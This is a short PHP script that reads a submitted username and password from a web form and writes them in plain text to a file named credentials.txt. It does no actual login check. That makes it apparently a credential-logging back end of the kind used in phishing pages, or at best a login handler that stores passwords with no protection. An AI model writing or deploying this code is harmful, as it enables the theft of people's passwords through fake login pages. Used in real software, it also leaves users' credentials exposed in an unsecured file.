<?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Save the login credentials to a file
  $file = fopen("credentials.txt", "w");
  fwrite($file, "Username: " . $username . "\n");
  fwrite($file, "Password: " . $password);
  fclose($file);
?>
